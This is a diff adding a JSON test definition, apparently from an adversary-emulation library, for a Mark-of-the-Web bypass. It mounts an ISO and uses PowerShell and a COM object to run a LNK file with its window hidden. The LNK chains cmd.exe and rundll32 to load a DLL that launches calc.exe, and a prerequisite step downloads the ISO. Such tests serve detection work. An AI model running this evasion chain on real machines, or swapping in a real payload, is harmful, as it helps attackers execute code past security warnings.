@@ -1,0 +1,37 @@
+{
+    "name": "Execute LNK file from ISO",
+    "description": "Executes LNK file document.lnk from AllTheThings.iso. Link file executes cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from the ISO which spawns calc.exe. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "Mount-DiskImage -ImagePath \"#{path_of_iso}\" -StorageType ISO -Access ReadOnly\n$keep = Get-Volume -FileSystemLabel \"AllTheThings\"\n$driveLetter = ($keep | Get-Volume).DriveLetter\n$instance = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"{c08afd90-f2a1-11d1-8455-00a0c91f3880}\"))\n$instance.Document.Application.ShellExecute($driveLetter+\":\\document.lnk\",\"\",$driveLetter+\":\\\",$null,0)\n",
+        "cleanup_command": "Dismount-DiskImage -ImagePath \"#{path_of_iso}\" | Out-Null\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1553.005",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Mark-of-the-Web Bypass",
+    "source": "ART",
+    "uuid": "c2587b8d-743d-4985-aa50-c83394eaeb68",
+    "arguments": {
+        "path_of_iso": {
+            "description": "Path to ISO file",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\T1553.005\\bin\\AllTheThings.iso"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "AllTheThings.iso must exist on disk at specified location (#{path_of_iso})\n",
+            "prereq_command": "if (Test-Path \"#{path_of_iso}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory (split-path \"#{path_of_iso}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/AllTheThings.iso -OutFile \"#{path_of_iso}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
